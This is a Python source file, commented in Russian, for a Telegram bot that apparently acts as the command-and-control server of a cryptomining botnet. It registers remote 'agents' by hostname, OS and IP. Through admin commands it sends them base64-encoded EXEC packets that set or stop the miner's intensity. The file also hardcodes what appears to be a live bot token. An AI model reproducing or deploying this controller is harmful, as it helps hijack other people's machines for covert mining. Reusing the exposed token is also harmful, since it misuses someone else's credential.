#!/usr/bin/env python3
# bot.py — для BotHost (bot-hosting.ru)
# Загрузите этот файл в корень проекта бота.

import telebot, json, time, base64, os, re

TOKEN = os.environ.get("BOT_TOKEN", "8800452125:AAETWvKIeP6BgDKWaSAmAhGm6WAq8TCm7pc")  # или вставьте токен напрямую
ADMIN_ID = 6099860667  # ваш числовой Telegram ID

bot = telebot.TeleBot(TOKEN)
agents = {}  # {chat_id: {hostname, os, ip, intensity}}

def is_admin(user_id):
    return user_id == ADMIN_ID

def send_exec(cid, cmd):
    packet = {"cmd": cmd, "ts": int(time.time())}
    payload = base64.b64encode(json.dumps(packet).encode()).decode()
    try:
        bot.send_message(cid, f"EXEC:{payload}")
        return True
    except:
        return False

# ==================== КОМАНДЫ ====================
@bot.message_handler(commands=['start', 'help'])
def help_cmd(msg):
    if not is_admin(msg.from_user.id):
        bot.reply_to(msg, f"Ваш ID: {msg.from_user.id}. Нет доступа.")
        return
    bot.reply_to(msg, """
🔧 Команды:
/clients — список агентов
/miner_power <id|all> <0-100> — изменить мощность майнера
/miner_stop <id|all> — остановить майнер
/status — статистика
""")

@bot.message_handler(commands=['clients'])
def clients_cmd(msg):
    if not is_admin(msg.from_user.id):
        return
    if not agents:
        bot.reply_to(msg, "Нет подключённых агентов")
        return
    text = "🖥 Агенты:\n\n"
    for cid, info in agents.items():
        text += f"`{cid}` | {info['hostname']} | {info['os']} | Мощность: {info.get('intensity','?')}%\n"
    bot.reply_to(msg, text, parse_mode="Markdown")

@bot.message_handler(commands=['miner_power'])
def miner_power_cmd(msg):
    if not is_admin(msg.from_user.id):
        return
    parts = msg.text.split()
    if len(parts) < 3:
        bot.reply_to(msg, "Использование: /miner_power <id|all> <0-100>")
        return
    target = parts[1].lower()
    try:
        intensity = int(parts[2])
        if not 0 <= intensity <= 100:
            raise ValueError
    except:
        bot.reply_to(msg, "Процент должен быть от 0 до 100")
        return

    cmd = f"MINER_INTENSITY:{intensity}"
    if target == "all":
        for cid in agents:
            if send_exec(cid, cmd):
                agents[cid]['intensity'] = intensity
        bot.reply_to(msg, f"Мощность майнера изменена на {intensity}% для всех")
    else:
        try:
            cid = int(target)
            if cid in agents:
                if send_exec(cid, cmd):
                    agents[cid]['intensity'] = intensity
                    bot.reply_to(msg, f"Мощность для {agents[cid]['hostname']} = {intensity}%")
                else:
                    bot.reply_to(msg, "Ошибка отправки")
            else:
                bot.reply_to(msg, "Агент не найден")
        except ValueError:
            bot.reply_to(msg, "Некорректный ID")

@bot.message_handler(commands=['miner_stop'])
def miner_stop_cmd(msg):
    if not is_admin(msg.from_user.id):
        return
    parts = msg.text.split()
    if len(parts) < 2:
        bot.reply_to(msg, "Использование: /miner_stop <id|all>")
        return
    target = parts[1].lower()
    cmd = "MINER_INTENSITY:0"
    if target == "all":
        for cid in agents:
            send_exec(cid, cmd)
            agents[cid]['intensity'] = 0
        bot.reply_to(msg, "Майнер остановлен на всех")
    else:
        try:
            cid = int(target)
            if cid in agents:
                send_exec(cid, cmd)
                agents[cid]['intensity'] = 0
                bot.reply_to(msg, "Майнер остановлен")
            else:
                bot.reply_to(msg, "Агент не найден")
        except:
            bot.reply_to(msg, "Ошибка")

@bot.message_handler(commands=['status'])
def status_cmd(msg):
    if not is_admin(msg.from_user.id):
        return
    total = len(agents)
    if total == 0:
        bot.reply_to(msg, "Нет агентов")
        return
    avg = sum(a.get('intensity',0) for a in agents.values()) / total
    bot.reply_to(msg, f"Агентов: {total}, средняя мощность: {avg:.0f}%")

# ==================== РЕГИСТРАЦИЯ АГЕНТОВ ====================
@bot.message_handler(func=lambda m: m.text and m.text.startswith("REG:"))
def reg_agent(msg):
    try:
        data = json.loads(base64.b64decode(msg.text[4:]).decode())
        cid = msg.chat.id
        agents[cid] = {
            "hostname": data.get("hostname","?"),
            "os": data.get("os","?"),
            "ip": data.get("ip","?"),
            "intensity": 0
        }
        bot.send_message(ADMIN_ID, f"🟢 Агент подключён: {data.get('hostname')}")
    except Exception as e:
        print(f"REG error: {e}")

# ==================== ЗАПУСК ====================
if __name__ == '__main__':
    print("Бот запущен...")
    bot.polling(none_stop=True)
